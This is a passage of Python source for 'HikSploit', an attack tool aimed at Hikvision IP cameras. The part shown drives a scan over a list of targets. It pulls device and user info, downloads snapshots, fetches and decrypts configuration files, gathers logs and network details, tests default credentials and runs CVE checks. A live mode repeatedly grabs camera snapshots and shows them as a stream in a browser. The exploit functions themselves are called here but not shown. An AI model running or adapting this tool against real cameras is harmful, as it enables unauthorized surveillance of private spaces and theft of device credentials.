        message = f"[-] Error fetching system logs: URL {url} Timed out."
        print(f"{Color.BRIGHT_RED}{message}{Color.RESET}")
        log_info(current_log_dir, message)
    except requests.exceptions.ConnectionError as e:
        message = f"[-] Connection error fetching system logs {url}: {e}."
        print(f"{Color.BRIGHT_RED}{message}{Color.RESET}")
        log_info(current_log_dir, message)
    except requests.exceptions.RequestException as e:
        message = f"[-] An unexpected request error occurred fetching system logs {url}: {e}."
        print(f"{Color.BRIGHT_RED}{message}{Color.RESET}")
        log_info(current_log_dir, message)


def run_normal_scan(args, targets_list):
    """Executes the normal vulnerability scanning and information gathering mode."""
    if not targets_list:
        print(f"{Color.BRIGHT_RED}[-] No targets to scan. Exiting normal scan.{Color.RESET}")
        return

    # Set up signal handlers for graceful exit or timeout
    signal.signal(signal.SIGQUIT, handle_signals)
    if args.target_timeout > 0:
        signal.signal(signal.SIGALRM, handle_signals)

    for ip_port in targets_list:
        if interrupted:
            break
        
        # Create a unique log directory for each target
        current_log_dir = os.path.join(args.output, f"{ip_port.replace(':', '_')}_{datetime.now().strftime('%Y%m%d_%H%M%S')}")
        os.makedirs(current_log_dir, exist_ok=True)
        
        print(f"\n{Color.BRIGHT_BLUE}--- Processing Target: {ip_port} ---{Color.RESET}")
        log_info(current_log_dir, f"Starting scan for target: {ip_port}")

        try:
            if args.target_timeout > 0:
                signal.alarm(args.target_timeout) # Set alarm for target timeout

            if not args.only_cves:
                directory_url = check_directory(ip_port, current_log_dir)
                if directory_url:
                    print_device_info(ip_port, current_log_dir)
                    print_user_info(ip_port, current_log_dir)
                    if not args.no_snapshot:
                        download_single_snapshot(directory_url, current_log_dir)
                    if not args.no_config_decrypt:
                        fetch_and_decrypt_config(ip_port, current_log_dir)
                    
                    if not args.no_extra_info:
                        get_firmware_details(ip_port, current_log_dir)
                        get_network_config(ip_port, current_log_dir)
                        get_system_logs(ip_port, current_log_dir)

                else:
                    log_info(current_log_dir, f"Skipping detailed information gathering for {ip_port} as base directory was not accessible.")
            
            if not args.no_default_creds:
                check_default_credentials(ip_port, current_log_dir)

            check_all_cves(ip_port, current_log_dir)
            
        except TargetTimeout:
            log_info(current_log_dir, f"Target scan timed out for {ip_port}.")
            print(f"{Color.BRIGHT_RED}--- Scan for {ip_port} timed out. Moving to next target. ---{Color.RESET}")
        finally:
            if args.target_timeout > 0:
                signal.alarm(0) # Clear alarm

        print(f"\n{Color.BRIGHT_GREEN}--- Finished processing {ip_port} ---\n{Color.RESET}")
        log_info(current_log_dir, f"Finished scan for target: {ip_port}")

    print(f"\n{Color.BRIGHT_WHITE}============================================{Color.RESET}")
    print(f"{Color.BRIGHT_WHITE}Scan complete for all targets.{Color.RESET}")
    print(f"{Color.BRIGHT_WHITE}============================================{Color.RESET}")

def run_live_streaming_mode(ip_port, current_log_dir, stream_interval):
    """Runs the live streaming mode, opening an HTML viewer in the browser."""
    print(f"\n{Color.BRIGHT_BLUE}========= Starting Live Streaming Mode ========={Color.RESET}")
    print(f"{Color.BRIGHT_CYAN}Attempting to stream from: {ip_port}{Color.RESET}")
    log_info(current_log_dir, f"Starting live streaming mode for: {ip_port}")

    stream_image_filename = "live_stream_snapshot.jpg"
    stream_image_path = os.path.join(current_log_dir, stream_image_filename)
    
    # HTML content for the live stream viewer
    html_content = f"""
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>HikSploit - Live Stream Viewer</title>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;700&display=swap');
        body {{
            font-family: 'Inter', sans-serif;
            background: linear-gradient(135deg, #f0f0f0 0%, #e0e0e0 100%); /* Light gradient background */
            color: #333;
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            margin: 0;
            overflow: hidden;
            padding: 20px;
            box-sizing: border-box;
        }}
        .container {{
            background: rgba(255, 255, 255, 0.15); /* White transparent background */
            backdrop-filter: blur(10px); /* Glassmorphism blur */
            border: 1px solid rgba(255, 255, 255, 0.18);
            border-radius: 20px; /* More rounded corners */
            box-shadow: 0 8px 32px 0 rgba(31, 38, 135, 0.1); /* Subtle shadow */
            padding: 30px;
            max-width: 90vw;
            width: 100%;
            text-align: center;
            display: flex;
            flex-direction: column;
            gap: 1.5rem;
            position: relative;
            overflow: hidden;
        }}
        .stream-window {{
            background: rgba(255, 255, 255, 0.1); /* Slightly more transparent for inner element */
            backdrop-filter: blur(5px);
            border: 1px solid rgba(255, 255, 255, 0.15);
            border-radius: 15px; /* Rounded corners */
            overflow: hidden;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 300px;
            width: 100%;
            position: relative;
            box-shadow: inset 0 0 10px rgba(255, 255, 255, 0.2); /* Inner shadow for depth */
        }}
        .stream-window img {{
            max-width: 100%;
            max-height: 100%;
            object-fit: contain;
            border-radius: 12px; /* Slightly less rounded than container */
        }}
        .message-box {{
            background-color: rgba(255, 0, 0, 0.1); /* Red transparent for error */
            color: #ff3b30; /* iOS Red */
            padding: 1rem;
            border-radius: 10px;
            border: 1px solid rgba(255, 0, 0, 0.2);
            margin-top: 1rem;
            font-weight: bold;
        }}
        .status-text {{
            color: #34c759; /* iOS Green */
            font-weight: bold;
        }}
        .github-link {{
            margin-top: 2rem;
            font-size: 0.9rem;
            color: #8e8e93; /* iOS Gray */
            text-decoration: none;
            transition: color 0.3s ease;
        }}
        .github-link:hover {{
            color: #007aff; /* iOS Blue */
        }}
    </style>
</head>
<body>
    <div class="container">
        <h1 style="color:#007aff; font-size:1.875rem; font-weight:700; margin-bottom:1rem;">HikSploit - Live Stream Viewer</h1>
        <p style="color:#555; font-size:1.125rem;">Streaming from: {ip_port}</p>
        <div class="stream-window">
            <img id="streamImage" src="{stream_image_filename}" alt="Live Stream" style="display:none;">
            <div id="loadingIndicator" style="position:absolute; color:#007aff; font-size:1.125rem; font-weight:bold;">Loading...</div>
        </div>
        <p id="statusMessage" class="status-text" style="margin-top:0.5rem;">Status: Initializing...</p>
        <div id="errorMessage" class="message-box" style="display:none;"></div>
    </div>
    <a href="https://github.com/aresowl" target="_blank" class="github-link">GitHub: aresowl</a>

    <script>
        const streamImage = document.getElementById('streamImage');
        const loadingIndicator = document.getElementById('loadingIndicator');
        const statusMessage = document.getElementById('statusMessage');
        const errorMessage = document.getElementById('errorMessage');

        const refreshInterval = {stream_interval * 1000}; 

        function showMessage(element, message, type = 'info') {{
            element.textContent = message;
            element.style.display = 'block';
            if (type === 'error') {{
                element.style.backgroundColor = 'rgba(255, 0, 0, 0.1)';
                element.style.color = '#ff3b30';
            }} else {{
                element.style.backgroundColor = 'transparent';
                element.style.color = '#34c759';
            }}
        }}

        function hideMessage(element) {{
            element.style.display = 'none';
        }}

        function refreshImage() {{
            // Create a temporary image to load the new snapshot
            const tempImage = new Image();
            tempImage.src = `{stream_image_filename}?_t=${{new Date().getTime()}}`;
            
            loadingIndicator.style.display = 'block'; // Show loading indicator
            hideMessage(errorMessage); // Hide previous error message

            tempImage.onload = () => {{
                streamImage.src = tempImage.src; // Update the main image only on successful load
                streamImage.style.display = 'block'; // Show the image
                loadingIndicator.style.display = 'none'; // Hide loading indicator
                showMessage(statusMessage, 'Status: Live streaming...'); // Update status
            }};

            tempImage.onerror = () => {{
                // If loading fails, keep the old image displayed and show an error
                streamImage.style.display = streamImage.src ? 'block' : 'none'; // Keep old image if exists, else hide
                loadingIndicator.style.display = 'none'; // Hide loading indicator
                showMessage(errorMessage, 'Error loading image. Ensure the camera is online and access is correct, and the Python script is running.', 'error');
                showMessage(statusMessage, 'Status: Error', 'error');
            }};
        }}

        // Initial load and periodic refresh
        refreshImage();
        setInterval(refreshImage, refreshInterval);
    </script>
</body>
</html>
"""

    html_file_path = os.path.join(current_log_dir, "live_stream_viewer.html")
    try:
        with open(html_file_path, "w") as f:
            f.write(html_content)
        
        print(f"{Color.BRIGHT_GREEN}[+] HTML viewer saved to: {html_file_path}{Color.RESET}")
        log_info(current_log_dir, f"HTML viewer saved to: {html_file_path}")

        # Open in default web browser
        webbrowser.open(f"file://{os.path.abspath(html_file_path)}")
        print(f"{Color.BRIGHT_GREEN}[+] Opening HTML viewer in default browser...{Color.RESET}")
        log_info(current_log_dir, "Opening HTML viewer in default browser.")

        snapshot_url = f"http://{ip_port}{CONFIG['paths']['snapshot']}"
        
        print(f"{Color.BRIGHT_CYAN}Continuously fetching snapshots from {ip_port}... (Ctrl+C to stop){Color.RESET}")
        log_info(current_log_dir, f"Starting continuous snapshot fetching for {ip_port}")

        frame_count = 0
        while True:
            if interrupted:
                break
            try:
                # Suppress console output for individual snapshot saves in streaming mode to avoid clutter
                original_stdout = sys.stdout
                sys.stdout = open(os.devnull, 'w')
                success = download_single_snapshot(snapshot_url, current_log_dir, fixed_filename=stream_image_filename)
                sys.stdout.close()
                sys.stdout = original_stdout # Restore stdout
                
                if success:
                    frame_count += 1
                    # Print a more concise message for each frame fetch in console
                    print(f"{Color.BRIGHT_GREEN}[{datetime.now().strftime('%H:%M:%S')}] Stream frame {frame_count} updated.{Color.RESET}")
                else:
                    # Error message already printed by download_single_snapshot, just log it here
                    log_info(current_log_dir, f"Failed to fetch stream snapshot for {ip_port}.")

            except Exception as e:
                sys.stdout = original_stdout # Ensure stdout is restored before printing error
                print(f"{Color.BRIGHT_RED}[{datetime.now().strftime('%H:%M:%S')}] Error fetching stream snapshot: {e}. Retrying...{Color.RESET}")
                log_info(current_log_dir, f"Error fetching stream snapshot: {e}")
            time.sleep(stream_interval)
            
    except KeyboardInterrupt:
        print(f"\n{Color.BRIGHT_YELLOW}[!] Live streaming stopped by user.{Color.RESET}")
        log_info(current_log_dir, "Live streaming stopped by user.")
    except Exception as e:
        print(f"{Color.BRIGHT_RED}[-] General error in live streaming mode: {e}{Color.RESET}")
        log_info(current_log_dir, f"General error in live streaming mode: {e}")
    finally:
        # Clean up: delete the HTML file and the last snapshot image
        if os.path.exists(html_file_path):
            os.remove(html_file_path)
            print(f"{Color.BRIGHT_YELLOW}[!] Deleted HTML viewer file: {html_file_path}{Color.RESET}")
            log_info(current_log_dir, f"Deleted HTML viewer file: {html_file_path}")
        if os.path.exists(stream_image_path):
            os.remove(stream_image_path)
            print(f"{Color.BRIGHT_YELLOW}[!] Deleted live stream snapshot: {stream_image_path}{Color.RESET}")
            log_info(current_log_dir, f"Deleted live stream snapshot: {stream_image_path}")

def main():
    parser = argparse.ArgumentParser(description="HikSploit - Hikvision Camera Vulnerability and Streaming Tool")
    parser.add_argument("-t", "--targets", default="targets.txt",
                        help="Path to the file containing target IP:Port list (default: targets.txt)")
    parser.add_argument("-o", "--output", default="logs",
                        help="Directory to save logs and output (default: logs)")
    parser.add_argument("--no-snapshot", action="store_true",
                        help="Do not download snapshots")
    parser.add_argument("--no-config-decrypt", action="store_true",
                        help="Do not attempt to fetch and decrypt configuration file")
    parser.add_argument("--only-cves", action="store_true",
                        help="Only run CVE checks, skip information gathering and downloads")
    parser.add_argument("--timeout", type=int, default=CONFIG["timeouts"]["default"],
                        help=f"Set default request timeout in seconds (default: {CONFIG['timeouts']['default']})")
    parser.add_argument("--target-timeout", type=int, default=0,
                        help="Set a maximum time in seconds for processing each target. 0 means no timeout.")
    parser.add_argument("--no-default-creds", action="store_true",
                        help="Do not check for default credentials")
    parser.add_argument("--no-extra-info", action="store_true",
                        help="Do not gather extra information (firmware, network, logs)")
    
    args = parser.parse_args()

    CONFIG["timeouts"]["default"] = args.timeout

    print_banner()

    targets = read_targets(args.targets)

    if not targets:
        print(f"\n{Color.BRIGHT_YELLOW}[!] No targets found in '{args.targets}' or file does not exist.{Color.RESET}")
        user_input_ip = input(f"{Color.BRIGHT_YELLOW}Please enter a single IP:Port to scan/stream (e.g., 192.168.1.100:80), or press Enter to exit: {Color.RESET}").strip()
        if user_input_ip:
            targets = [user_input_ip]
            print(f"{Color.BRIGHT_GREEN}Using provided IP: {user_input_ip}{Color.RESET}")
        else:
            print(f"{Color.BRIGHT_RED}[-] No target provided. Exiting.{Color.RESET}")
            return

    while True:
        print(f"\n{Color.BRIGHT_WHITE}Please select a mode:{Color.RESET}")
        print(f"{Color.BRIGHT_CYAN}1. Normal Scan (Vulnerability checks and information gathering){Color.RESET}")
        print(f"{Color.BRIGHT_CYAN}2. Live Streaming (View live camera feed in browser){Color.RESET}")
        choice = input(f"{Color.BRIGHT_YELLOW}Your choice (1 or 2): {Color.RESET}").strip()

        if choice == '1':
            print(f"{Color.BRIGHT_GREEN}Normal scan mode selected.{Color.RESET}")
            run_normal_scan(args, targets)
            break
        elif choice == '2':
            print(f"{Color.BRIGHT_GREEN}Live streaming mode selected.{Color.RESET}")
            # Use the first target from the (potentially user-provided) targets list
            stream_target_ip_port = targets[0]
            stream_log_dir = os.path.join(args.output, f"{stream_target_ip_port.replace(':', '_')}_live_stream_{datetime.now().strftime('%Y%m%d_%H%M%S')}")
            os.makedirs(stream_log_dir, exist_ok=True)
            
            stream_interval_seconds = 2 # Updated interval for HTML viewer
            run_live_streaming_mode(stream_target_ip_port, stream_log_dir, stream_interval_seconds)
            break
        else:
            print(f"{Color.BRIGHT_RED}Invalid choice. Please enter 1 or 2.{Color.RESET}")

if __name__ == "__main__":
    signal.signal(signal.SIGQUIT, handle_signals)
    main()
